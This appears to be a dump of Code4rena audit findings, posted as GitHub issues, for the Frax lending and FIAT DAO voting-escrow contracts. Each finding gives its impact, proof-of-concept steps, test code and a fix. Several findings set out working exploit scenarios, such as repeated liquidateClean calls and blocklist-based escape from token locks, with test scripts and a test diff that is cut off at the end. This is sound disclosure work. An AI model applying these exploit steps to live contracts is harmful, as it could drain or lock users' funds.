"https://github.com/code-423n4/2022-08-frax-findings/issues/102", "labels": ["bug", "3 (High Risk)", "high quality report", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L997-L1015   # Vulnerability details  ## Impact  Leftover shares in `liquidateClean` are only subtracted from pair totals, but not from user's borrowed shares. This means that after `liquidateClean`, borrower's shares will be greater than `0` (leftover shares after liquidations), but the user is still insolvent and can be liquidated again and again (with `_sharesToLiquidate` set to `0`). Each subsequent liquidation will write off the bad debt (reduce pair totals by borrower leftover shares/amounts), but doesn't take anything from liquidator nor borrower (since `_sharesToLiquidate == 0`).  This messes up the whole pair accounting, with total asset amounts reducing and total borrow amounts and shares reducing. This will make it impossible for borrowers to repay debt (or be liquidated), because borrow totals will underflow, and lenders amount to withdraw will reduce a lot (they will share non-existant huge bad debt).  Reducing pair totals scenario: 1. Alice borrows `1000 FRAX` (`1000` shares) against `1.5 ETH` collateral (`1 ETH = 1000`, `Max LTV` = `75%`) 2. ETH drops to `500` very quickly with liquidators being unable to liquidate Alice due to network congestion 3. At ETH = `500`, Alice collateral is worth `750` against `1000 FRAX` debt, making Alice insolvent and in a bad debt 4. Liquidator calls `liquidateClean` for `800` shares, which cleans up all available collateral of `1.5 ETH`. 5. At this point Alice has `200` shares debt with `0` collateral 6. Liquidator repeatedly calls `liquidateClean` with `0` shares to liquidate. Each call pair totals are reduced by `200` shares (and total borrow amount by a corresponding amount). 7. When pair totals reach close to `0`, the pool is effectively locked. Borrowers can't repay, lenders can withdraw severly reduced amounts.  ## Proof of Concept  Copy this to src/test/e2e/LiquidationBugTest.sol  https://gist.github.com/panprog/cbdc1658d63c30c9fe94127a4b4b7e72   ## Recommended Mitigation Steps  After the line  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairCore.sol#L1012  add          _sharesToLiquidate += _sharesToAdjust;"}, {"title": "FraxlendPair.sol is not fully EIP-4626 compliant", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L136-L138 https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPair.sol#L140-L142   # Vulnerability details  ## Impact FraxlendPair.sol is not EIP-4626 compliant, variation from the standard could break composability and potentially lead to loss of funds  ## Proof of Concept  According to EIP-4626 method specifications (https://eips.ethereum.org/EIPS/eip-4626)  For maxDeposit:      MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it MUST return 0.  For maxMint:      MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0.  When FraxlendPair.sol is paused, deposit and mint are both disabled. This means that maxMint and maxDeposit should return 0 when the contract is paused.   The current implementations of maxMint and maxDeposit do not follow this specification:      function maxDeposit(address) external pure returns (uint256) {         return type(uint128).max;     }      function maxMint(address) external pure returns (uint256) {         return type(uint128).max;     }  No matter the state of the contract they always return uint128.max, but they should return 0 when the contract is paused.  ## Tools Used  ## Recommended Mitigation Steps  maxDeposit and maxMint should be updated to return 0 when contract is paused. Use of the whenNotPaused modifier is not appropriate because that would cause a revert and maxDeposit and maxMint should never revert according to EIP-4626"}, {"title": "Denial of service in globalPause by wrong logic", "html_url": "https://github.com/code-423n4/2022-08-frax-findings/issues/76", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-frax-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairDeployer.sol#L405   # Vulnerability details  ## Impact The method `globalPause` is not tested and it doesn't work as expected.  ## Proof of Concept Because the method returns an array (`_updatedAddresses`) and has never been initialized, when you want to set its value, it fails.  Recipe:  - Call `globalPause` with any valid address. - The transaction will FAULT.  ## Affected source code  - [FraxlendPairDeployer.sol#L405](https://github.com/code-423n4/2022-08-frax/blob/c4189a3a98b38c8c962c5ea72f1a322fbc2ae45f/src/contracts/FraxlendPairDeployer.sol#L405)  ## Recommended Mitigation Steps  Initialize the `_updatedAddresses` array like shown bellow:  ```diff     function globalPause(address[] memory _addresses) external returns (address[] memory _updatedAddresses) {         require(msg.sender == CIRCUIT_BREAKER_ADDRESS, \"Circuit Breaker only\");         address _pairAddress;         uint256 _lengthOfArray = _addresses.length; +       _updatedAddresses = new address[](_lengthOfArray);         for (uint256 i = 0; i < _lengthOfArray; ) {             _pairAddress = _addresses[i];             try IFraxlendPair(_pairAddress).pause() {                 _updatedAddresses[i] = _addresses[i];             } catch {}             unchecked {                 i = i + 1;             }         }     } ```"}, {"title": "`increaseUnlockTime` missing `_checkpoint` for delegated values", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/318", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L509-L515   # Vulnerability details  ### [PNM-001] `increaseUnlockTime` missing `_checkpoint` for delegated values.   #### Links  + https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L509-L515  #### Description  In the VotingEscrow contract, users can increase their voting power by: + Adding more funds to their delegated valule + Increasing the time of their lock + Being delegated by another user  Specifically, when users are delegated by other users through the `delegate` function, the delegated user gains control over the delegate funds from the delegating user.   The delegated user can further increase this power by increasing the time that the delegated funds are locked by calling `increaseUnlockTime`, resulting in ALL the delegated funds controlled by the delegated user, including those that do not originate from the delegated user, being used to increase the voting power of the user.  The issue lies in the following scenario: If user A delegates to user B, and then user B delegates to user C, user B loses the ability to extend his or her voting power by `increaseUnlockTime` due to a missing `_checkpoint` operation. If user B calls the `increaseUnlockTime` function, the `_checkpoint` operation will not proceed, as user B is delegating to user C. However, B still owns delegated funds, in the form of the funds delegated from user A. Therefore, user B should still gain voting power from `increaseUnlockTime`, even though user B is delegating.  #### PoC / Attack Scenario  Assume three users, Alice, Bob, and Carol, who each possess `locks` with 10 units of `delegate` value. Also assume that the unlock time is 1 week.  + Alice delegates her 10 units to Bob. + Bob then delegates his 10 units to Carol. + At this point, Alice has 0 `delegate`, value, Bob has 10 `delegate` value, and Carol has 20 `delegate` value. + Carol calls `increaseUnlockTime` to 2 weeks, resulting in `_checkpoint` raising her voting power accordingly. + Bob calls `increaseUnlockTime` to 2 weeks, resulting in no change in his voting power, even though he has 10 units of `delegate` value.   #### Suggested Fix  Move the `_checkpoint` outside of the `if` statement on line 514.  ---"}, {"title": "Wrong logic in `_checkpoint()` function might lead to wrong value of `balanceOfAt()`, `totalSupplyAt()`", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/294", "labels": ["bug", "duplicate", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L257-L264 https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L372   # Vulnerability details  ## Impact  In function `_checkpoint()`, new values of `userPointHistory` and `pointHistory` are override old values instead of appending to the end of the list, i.e creating new element.  The result is if we try to get `balanceOf` or `totalSupply` at current block number, it just return wrong value because values of `globalEpoch` is overrided.  ## Proof of Concept  [Line 257-264](https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L257-L264) ```solidity if (uEpoch == 0) {     userPointHistory[_addr][uEpoch + 1] = userOldPoint; }  userPointEpoch[_addr] = uEpoch + 1; userNewPoint.ts = block.timestamp; userNewPoint.blk = block.number; userPointHistory[_addr][uEpoch + 1] = userNewPoint; ```  When `uEpoch == 0`, values of `userPointHistory` with `index = uEpoch + 1` is updated to `userOldPoint` but in line 264, values of `userPointHistory` with `index = uEpoch + 1` is overrided to `userNewPoint` which basically makes line 257-259 has no meaning.  Similarly issue with value of `pointHistory[epoch]` in [line 372](https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L372)  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Update logic of `_checkpoint()`, for example, use `++` operator to make sure `epoch` is increased each time it appends new element.   "}, {"title": "Inconsistent logic of increase unlock time to the expired locks", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/254", "labels": ["bug", "2 (Med Risk)", "high quality report", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L493-L523   # Vulnerability details  # [2022-08-fiatdao] Inconsistent logic of increase unlock time to the expired locks ## Impact Can not prevent expired locks being extended.  ## Proof of Concept https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L493-L523  Call function function `increaseUnlockTime()` with an expired lock (locked[msg.sender].end < block.timestamp) * Case 1: if sender's lock was not delegated to another address, function will be revert because of the requirement https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L511 * Case 2: if sender's lock was delegated to another address, function will not check anything and the lock can be extended.  But in case 1, sender\u2019s lock was not delegated to another, the sender can delegate to new address with end time of lock equal to new end time. After that he can call `increaseUnlockTime()` and move to case 2. Then sender can undelegate and the lock will be extended, and sender will take back vote power.  Here is the script : ``` typescript= describe(\"voting escrow\", async () => {     it(\"increase unlock time issue\", async () => {       await createSnapshot(provider);       //alice creates lock       let lockTime = WEEK + (await getTimestamp());       await ve.connect(alice).createLock(lockAmount, lockTime);       // bob creates lock       lockTime = 50 * WEEK + (await getTimestamp());       await ve.connect(bob).createLock(10 ** 8, lockTime);       //pass 1 week, alice's lock is expired       await ethers.provider.send(\"evm_mine\", [await getTimestamp() + WEEK]);       expect(await ve.balanceOf(alice.address)).to.eq(0);       //alice can not increase unlock timme       await expect(ve.connect(alice).increaseUnlockTime(lockTime)).to.be.revertedWith(\"Lock expired\");       //alice delegate to bob then can increase unlock time       await ve.connect(alice).delegate(bob.address);       await expect(ve.connect(alice).increaseUnlockTime(lockTime)).to.not.be.reverted;       //alice delegate back herself       await ve.connect(alice).delegate(alice.address);       expect(await ve.balanceOf(alice.address)).to.gt(0);     }); ```  ## Tools Used Manual review ## Recommended Mitigation Steps In every cases, expired locks should able to be extended -> should remove line https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L511 "}, {"title": "ERROR IN UPDATING  **_checkpoint** IN THE **increaseUnlockTime** FUNCTION", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/217", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L513-L514   # Vulnerability details  ## Impact  The potentiel impact of this error are :  * Give wrong voting power to a user at a given block. * Give wrong total voting power at a given block. * Give wrong total voting power.  ## Proof of Concept  The error occured in this line : https://github.com/code-423n4/2022-08-fiatdao/blob/main/contracts/VotingEscrow.sol#L513  In the **increaseUnlockTime** function the oldLocked.end passed to the function **_checkpoint** is wrong as it is the same as the new newLock end time (called unlock_time) instead of being equal to **oldUnlockTime** .  In the given CheckpointMath.md file it is stated that checkpoint details for  **increaseUnlockTime** function should be :  |  Lock | amount | end |  | ------------- |:-------------:|:-------------:| | old   | owner.delegated  | owner.end  |   | new  | owner.delegated  | T |    BUT with this error  you get a different checkpoint details :   |  Lock | amount | end |  | ------------- |:-------------:|:-------------:| | old   | owner.delegated  | T  |   | new  | owner.delegated  | T |    The error is illustrated in the code below :  ```         LockedBalance memory locked_ = locked[msg.sender];         uint256 unlock_time = _floorToWeek(_unlockTime); // Locktime is rounded down to weeks         /* @audit comment                  the unlock_time represent the newLock end time         */         // Validate inputs         require(locked_.amount > 0, \"No lock\");         require(unlock_time > locked_.end, \"Only increase lock end\");         require(unlock_time <= block.timestamp + MAXTIME, \"Exceeds maxtime\");         // Update lock         uint256 oldUnlockTime = locked_.end;         locked_.end = unlock_time;         /* @audit comment                  The locked_ end time is update from  oldUnlockTime  ==>  unlock_time         */         locked[msg.sender] = locked_;         if (locked_.delegatee == msg.sender) {             // Undelegated lock             require(oldUnlockTime > block.timestamp, \"Lock expired\");             LockedBalance memory oldLocked = _copyLock(locked_);             oldLocked.end = unlock_time;             /* @audit comment                  The oldLocked.end is set to unlock_time instead of   oldUnlockTime              */             _checkpoint(msg.sender, oldLocked, locked_);         } ```  The impact of this is when calculating the **userOldPoint.bias** in the **_checkpoint** function you get an incorrect value equal to **userNewPoint.bias** (because oldLocked.end == _newLocked.end which is wrong).  ``` 240        userOldPoint.bias = 241                    userOldPoint.slope * 242                    int128(int256(_oldLocked.end - block.timestamp)); ```  The wrong **userOldPoint.bias** value is later used to calculate and update the bias value for the new point in **PointHistory**.   ``` 359       lastPoint.bias = 360                  lastPoint.bias + 361                  userNewPoint.bias - 362                  userOldPoint.bias;  372       pointHistory[epoch] = lastPoint; ```  And added to that the wrong **oldLocked.end** is used to get oldSlopeDelta value which is used to update the **slopeChanges**.  ``` 271       oldSlopeDelta = slopeChanges[_oldLocked.end];  380       oldSlopeDelta = oldSlopeDelta + userOldPoint.slope; 381       if (_newLocked.end == _oldLocked.end) { 382                  oldSlopeDelta = oldSlopeDelta - userNewPoint.slope; // It was a new deposit, not extension 383        } 384       slopeChanges[_oldLocked.end] = oldSlopeDelta; ```   As the **PointHistory** and the **slopeChanges** values are used inside the functions **balanceOfAt()** ,  **_supplyAt()**,  **totalSupply()**,  **totalSupplyAt()** to calculate the voting power, THIS ERROR COULD GIVE WRONG VOTING POWER AT A GIVEN BLOCK OF A USER OR CAN GIVE WRONG TOTAL VOTING POWER.  ## Tools Used  Manual Audit  ## Recommended Mitigation Steps  The line 513 in the VotingEscrow.sol contract :  ```       513      oldLocked.end = unlock_time; ```  Need to be replaced with the following :  ```       513      oldLocked.end = oldUnlockTime; ```"}, {"title": "Delegators can Avoid Lock Commitments if they can Reliably get Themselves Blocked when Needed", "html_url": "https://github.com/code-423n4/2022-08-fiatdao-findings/issues/204", "labels": ["bug", "3 (High Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-08-fiatdao-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-fiatdao/blob/fece3bdb79ccacb501099c24b60312cd0b2e4bb2/contracts/VotingEscrow.sol#L526-L625   # Vulnerability details  ## Impact Users can enjoy the voting power of long lock times whilst not committing their tokens. This could cause the entire system to break down as the incentives don't work any more.  ## Exploit Method This exploit only works if a user is able to use the system and reliably get themselves blocked. Blocking policies are not in scope, so I am assuming there would be a list of bannable offences, and thus this condition could be fulfilled. Consider a user with two accounts, called Rider and Horse. Rider has 100,000 tokens. Horse has 1 token. Rider is a smart contract (required for an account to be bannable). Rider locks for 1 week. Horse locks for 52 weeks. Rider delegates to Horse. Horse can continue to extend its lock period and enjoy the maximised voting power. Whenever the user wants their tokens back, they simply need to get the Rider account blocked. When Rider is blocked, `Blocklist.block(RiderAddress)` is called, which in turn calls `ve.forceUndelegate(RiderAddress)`. Rider is now an undelegated account with an expired lock. It can call `ve.withdraw()` to get its tokens back. The user can repeat this process with a fresh account taking the role of Rider.  ## Recommended Mitigation Steps `forceUndelegate()` could be made to set `locked_.end = fromLocked.end`. This would mean that blocked users are still locked into the system for the period they delegated for. However, this does have the downside of tokens being locked in the system without the full rights of the system which other users enjoy. Alternatively, this might be addressable through not blocking users that seem to be doing this, but of course that might have other undersirable consequences.  ## Proof of Concept ```diff diff --git a/test/votingEscrowTest.ts b/test/votingEscrowBlockMeTest.ts index 7d3163d..ed27155 100644 --- a/test/votingEscrowTest.ts +++ b/test/votingEscrowBlockMeTest.ts @@ -25,7 +25,7 @@ describe(\"VotingEscrow Tests\", function () {    let fdtMock: MockERC20;    let contract: MockSmartWallet;    let contract2: MockSmartWallet; // ADD TEST FOR 0 BALANCES -  let contract3: MockSmartWallet; +  let rider: MockSmartWallet;    let admin: SignerWithAddress;    let treasury: SignerWithAddress;    const maxPenalty = utils.parseEther(\"1\"); @@ -36,6 +36,7 @@ describe(\"VotingEscrow Tests\", function () {    let charlie: SignerWithAddress;    let david: SignerWithAddress;    let eve: SignerWithAddress; +  let horse: SignerWithAddress;    const initialFDTuserBal = utils.parseEther(\"1000\");    const lockAmount = utils.parseEther(\"100\");    let tx; @@ -57,7 +58,7 @@ describe(\"VotingEscrow Tests\", function () {      await createSnapshot(provider);        signers = await ethers.getSigners(); -    [admin, alice, bob, charlie, david, eve, treasury] = signers; +    [admin, alice, bob, charlie, david, eve, treasury, horse] = signers;        // Deploy FDT contract      const fdtMockDeployer = await ethers.getContractFactory(\"MockERC20\", admin); @@ -69,6 +70,7 @@ describe(\"VotingEscrow Tests\", function () {      await fdtMock.mint(charlie.address, initialFDTuserBal);      await fdtMock.mint(david.address, initialFDTuserBal);      await fdtMock.mint(eve.address, initialFDTuserBal); +    await fdtMock.mint(horse.address, initialFDTuserBal);        // Deploy VE contract      const veDeployer = await ethers.getContractFactory(\"VotingEscrow\", admin); @@ -96,6 +98,7 @@ describe(\"VotingEscrow Tests\", function () {      await fdtMock.setAllowance(charlie.address, ve.address, MAX);      await fdtMock.setAllowance(david.address, ve.address, MAX);      await fdtMock.setAllowance(eve.address, ve.address, MAX); +    await fdtMock.setAllowance(horse.address, ve.address, MAX);        // Deploy malicious contracts      const contractDeployer = await ethers.getContractFactory( @@ -108,8 +111,8 @@ describe(\"VotingEscrow Tests\", function () {      contract2 = await contractDeployer.deploy(fdtMock.address);      await fdtMock.mint(contract2.address, initialFDTuserBal);   -    contract3 = await contractDeployer.deploy(fdtMock.address); -    await fdtMock.mint(contract3.address, initialFDTuserBal); +    rider = await contractDeployer.deploy(fdtMock.address); +    await fdtMock.mint(rider.address, initialFDTuserBal);    });    after(async () => {      await restoreSnapshot(provider); @@ -139,722 +142,54 @@ describe(\"VotingEscrow Tests\", function () {      });    });   -  describe(\"Blocklist checker\", async () => { -    it(\"Blocklist EOA fails\", async () => { +  describe(\"C4 POCs\", async () => { +    it(\"Rider locks many tokens for a week.\", async () => {        await createSnapshot(provider); +      const smallLockTime = 1 * WEEK + (await getTimestamp());   -      expect(await blocklist.isBlocked(alice.address)).to.equal(false); -      expect(await blocklist.isBlocked(bob.address)).to.equal(false); - -      tx = blocklist.block(alice.address); -      await expect(tx).to.be.revertedWith(\"Only contracts\"); -    }); - -    it(\"Blocklist contract succeeds\", async () => { -      const lockTime = 4 * WEEK + (await getTimestamp()); - -      expect(await blocklist.isBlocked(contract.address)).to.equal(false); -      await contract.createLock(ve.address, lockAmount, lockTime); - -      await blocklist.block(contract2.address); -      expect(await blocklist.isBlocked(contract2.address)).to.equal(true); -    }); - -    it(\"Only owner can blocklist\", async () => { -      tx = blocklist.connect(bob).block(contract.address); -      await expect(tx).to.be.revertedWith(\"Only manager\"); - -      await restoreSnapshot(provider); -    }); -  }); - -  describe(\"EOA flow\", async () => { -    it(\"Alice and Bob lock FDT in ve\", async () => { -      await createSnapshot(provider); -      const lockTime = 4 * WEEK + (await getTimestamp()); - -      await ve.connect(alice).createLock(lockAmount, lockTime); - -      await ve.connect(bob).createLock(lockAmount, lockTime); -    }); - -    it(\"Alice and Bob attempt to withdraw before lock end, fail\", async () => { -      tx = ve.connect(alice).withdraw(); -      await expect(tx).to.be.revertedWith(\"Lock not expired\"); - -      tx = ve.connect(bob).withdraw(); -      await expect(tx).to.be.revertedWith(\"Lock not expired\"); -    }); - -    it(\"Alice attempts to quit lock, succeeds with penalty\", async () => { -      // Increase time to 2 weeks to lock end -      await increaseTimeTo((await ve.lockEnd(alice.address)).sub(WEEK * 2)); -      await ve.connect(alice).quitLock(); - -      // Penalty is ~ 3.84% (2/52*100) -      assertBNClosePercent( -        await fdtMock.balanceOf(alice.address), -        initialFDTuserBal.sub(lockAmount.mul(2).div(MAXTIME)), -        \"0.4\" -      ); -    }); - -    it(\"Check accumulated penalty and collect\", async () => { -      const lockAmount = utils.parseEther(\"100\"); -      expect(await ve.penaltyAccumulated()).gt(0); - -      const penaltyAccumulated = await ve.penaltyAccumulated(); - -      await ve.collectPenalty(); - -      expect(await ve.penaltyAccumulated()).to.equal(0); - -      expect(await fdtMock.balanceOf(treasury.address)).to.equal( -        penaltyAccumulated -      ); -    }); - -    it(\"Bob increase his unlock time\", async () => { -      const lockTime = 10 * WEEK + (await getTimestamp()); -      await ve.connect(bob).increaseUnlockTime(lockTime); -    }); - -    it(\"Alice locks again after locked expired, succeed\", async () => { -      await increaseTime(5 * WEEK); -      const lockTime = 4 * WEEK + (await getTimestamp()); -      await ve.connect(alice).createLock(lockAmount, lockTime); -    }); - -    it(\"Admin unlocks ve contracts\", async () => { -      tx = ve.connect(alice).withdraw(); -      await expect(tx).to.be.revertedWith(\"Lock not expired\"); - -      await ve.unlock(); - -      expect(await ve.maxPenalty()).to.equal(0); -    }); - -    it(\"Alice and Bob attempt to quit lock, succeeds without penalty\", async () => { -      await ve.connect(alice).quitLock(); -      assertBNClosePercent( -        await fdtMock.balanceOf(alice.address), -        initialFDTuserBal.sub(lockAmount.mul(2).div(MAXTIME)), -        \"0.4\" -      ); - -      await ve.connect(bob).quitLock(); -      expect(await fdtMock.balanceOf(bob.address)).to.equal(initialFDTuserBal); // because bob did not quit lock previously but deposited twice - -      expect(await ve.penaltyAccumulated()).to.equal(0); - -      await restoreSnapshot(provider); -    }); -  }); - -  describe(\"Malicious contracts flow\", async () => { -    it(\"2 contracts lock FDT in ve\", async () => { -      await createSnapshot(provider); - -      const lockTime = 4 * WEEK + (await getTimestamp()); - -      // contract 1 -      await contract.createLock(ve.address, lockAmount, lockTime); -      expect(await ve.balanceOf(contract.address)).not.eq(0); -      expect(await ve.balanceOfAt(contract.address, await getBlock())).not.eq( -        0 -      ); - -      // contract 2 -      await contract2.createLock(ve.address, lockAmount, lockTime); -      expect(await ve.balanceOf(contract2.address)).not.eq(0); -      expect(await ve.balanceOfAt(contract2.address, await getBlock())).not.eq( -        0 -      ); -    }); - -    it(\"Blocklisted contract CANNOT increase amount of tokens\", async () => { -      // = await Deployer.deploy(ve.address); -      await blocklist.block(contract.address); -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); - -      await expect( -        contract.increaseAmount(ve.address, lockAmount) -      ).to.be.revertedWith(\"Blocked contract\"); - -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); -    }); - -    it(\"Blocklisted contract CANNOT increase locked time\", async () => { -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); - -      await expect( -        contract.increaseUnlockTime( -          ve.address, -          (await getTimestamp()) + 10 * WEEK -        ) -      ).to.be.revertedWith(\"Blocked contract\"); - -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); -    }); - -    it(\"Blocklisted contract can quit lock\", async () => { -      await increaseTime(ONE_WEEK); -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); - -      await contract.quitLock(ve.address); - -      assertBNClosePercent( -        await fdtMock.balanceOf(contract.address), -        initialFDTuserBal.sub(lockAmount.mul(2 * WEEK).div(MAXTIME)), -        \"0.5\" -      ); -      // expect(await fdtMock.balanceOf(contract.address)).to.equal( -      //   initialFDTuserBal.sub(lockAmount.div(2)) -      // ); -    }); - -    it(\"Admin unlocks ve contracts\", async () => { -      await ve.unlock(); - -      expect(await ve.maxPenalty()).to.equal(0); -    }); - -    it(\"Allowed contract can quit lock without penalty\", async () => { -      // not blocklisted contract -      await contract2.quitLock(ve.address); -      expect(await fdtMock.balanceOf(contract2.address)).to.equal( -        initialFDTuserBal -      ); - -      await restoreSnapshot(provider); -    }); -  }); - -  describe(\"Blocked contracts undelegation\", async () => { -    it(\"2contracts lock FDT in ve\", async () => { -      await createSnapshot(provider); - -      const lockTime = 4 * WEEK + (await getTimestamp()); -      const lockTime2 = 2 * WEEK + (await getTimestamp()); -      // contract 1 -      await contract.createLock(ve.address, lockAmount, lockTime); -      expect(await ve.balanceOf(contract.address)).not.eq(0); -      expect(await ve.balanceOfAt(contract.address, await getBlock())).not.eq( -        0 -      ); - -      // contract 2 -      await contract2.createLock(ve.address, lockAmount, lockTime); -      expect(await ve.balanceOf(contract2.address)).not.eq(0); -      expect(await ve.balanceOfAt(contract2.address, await getBlock())).not.eq( -        0 -      ); -      // contract 3 -      await contract3.createLock(ve.address, lockAmount, lockTime); -      expect(await ve.balanceOf(contract3.address)).not.eq(0); -      expect(await ve.balanceOfAt(contract3.address, await getBlock())).not.eq( -        0 -      ); -    }); - -    it(\"Admin blocklists malicious contracts\", async () => { -      // contract 2 delegates first -      await contract2.delegate(ve.address, contract.address); -      await blocklist.block(contract2.address); +      await rider.createLock(ve.address, initialFDTuserBal, smallLockTime);      }); +    it(\"Horse locks a billionth of a token for max time.\", async () => { +      const bigLockTime = 52 * WEEK + (await getTimestamp());   -    it(\"Blocked contract gets UNDELEGATED\", async () => { -      await contract.delegate(ve.address, contract3.address); -      expect((await ve.locked(contract.address)).delegatee).to.equal( -        contract3.address -      ); -      await blocklist.block(contract.address); -      expect((await ve.locked(contract.address)).delegatee).to.equal( -        contract.address -      ); -    }); - -    it(\"CANNOT delegate to a blocked Contract\", async () => { -      // contract 3  cannot delegate to contract -      await expect( -        contract3.delegate(ve.address, contract.address) -      ).to.be.revertedWith(\"Blocked contract\"); -      await blocklist.block(contract2.address); -    }); - -    it(\"Blocked contract CANNOT delegate to another user\", async () => { -      //contract 3 is not blocked -      expect(await blocklist.isBlocked(contract3.address)).to.equal(false); -      // contract 1 is blocked -      await expect( -        contract.delegate(ve.address, contract3.address) -      ).to.be.revertedWith(\"Blocked contract\"); -    }); - -    it(\"Blocked contract is already undelegated\", async () => { -      expect((await ve.locked(contract.address)).delegatee).to.equal( -        contract.address -      ); -      // contract 1 is blocked -      await expect( -        contract.delegate(ve.address, contract.address) -      ).to.be.revertedWith(\"Blocked contract\"); -    }); - -    it(\"Blocklisted contract CANNOT increase amount of tokens\", async () => { -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); - -      await expect( -        contract.increaseAmount(ve.address, lockAmount) -      ).to.be.revertedWith(\"Blocked contract\"); - -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); +      await ve.connect(horse).createLock(1_000_000_000, bigLockTime);      }); - -    it(\"Blocklisted contract CANNOT increase locked time\", async () => { -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); - -      await expect( -        contract.increaseUnlockTime( -          ve.address, -          (await getTimestamp()) + 10 * WEEK -        ) -      ).to.be.revertedWith(\"Blocked contract\"); - -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); -    }); - -    it(\"Blocklisted contract can quit lock\", async () => { -      await increaseTime(ONE_WEEK); -      expect(await fdtMock.balanceOf(contract.address)).to.equal( -        initialFDTuserBal.sub(lockAmount) -      ); - -      await contract.quitLock(ve.address); - -      assertBNClosePercent( -        await fdtMock.balanceOf(contract.address), -        initialFDTuserBal.sub(lockAmount.mul(2 * WEEK).div(MAXTIME)), -        \"0.5\" -      ); -    }); -    it(\"Blocked contracts can withdraw\", async () => { -      await increaseTime(ONE_WEEK.mul(10)); -      // blocked contract can still -      await contract2.withdraw(ve.address); - -      await restoreSnapshot(provider); -    }); -  }); - -  describe(\"Delegation flow\", async () => { -    it(\"Alice creates a lock\", async () => { -      await createSnapshot(provider); - -      const lockTime = 4 * WEEK + (await getTimestamp()); - -      await ve.connect(alice).createLock(lockAmount, lockTime); - -      const block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.above(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0); -    }); - -    it(\"Bob creates a lock, Alice delegates to Bob\", async () => { -      const lockTime = 5 * WEEK + (await getTimestamp()); - -      // pre lock balances -      let block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.above(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.equal(0); - -      // bob creates lock -      await ve.connect(bob).createLock(lockAmount, lockTime); - -      block = await getBlock(); -      const preBalance = await ve.balanceOfAt(bob.address, block); -      expect(preBalance).to.above(0); - -      // alice delegates -      await ve.connect(alice).delegate(bob.address); - -      // post lock balances -      block = await getBlock(); -      expect(await ve.balanceOfAt(alice.address, block)).to.equal(0); -      expect(await ve.balanceOfAt(bob.address, block)).to.above(preBalance); -    }); - -    it(\"Bob extends his lock beyond Alice's lock, succeeds\", async () => { -      const lockTime = 6 * WEEK + (await getTimestamp()); - +    it(\"Rider delegates to Horse, increasing its voting power\", async () => {        